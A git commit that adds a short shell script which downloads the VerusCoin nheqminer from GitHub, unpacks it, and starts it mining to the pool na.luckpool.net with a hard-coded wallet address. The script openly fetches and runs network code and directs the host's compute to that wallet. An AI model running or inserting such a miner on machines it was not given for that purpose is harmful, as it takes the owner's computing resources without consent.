7dd751a7838c0ab6a258626ed527cc05dac44316
marinabarros320168 <121142741+marinabarros320168@users.noreply.github.com>
2023-01-30 14:57:39 -0300

    Create nhq.sh

---
+++ nhq.sh
@@ -0,0 +1,6 @@
+# veruscoin
+sudo apt update
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.0/nheqminer-Linux-v0.8.0.tar.gz
+tar xf nheqminer-Linux-v0.8.0.tar.gz
+cd nheqminer
+./nheqminer -v -l na.luckpool.net:3956 -u RV15qZeZ9qggbWznCwQ8mcvfyRrhB9zEEN.rig1 -p x -t 4
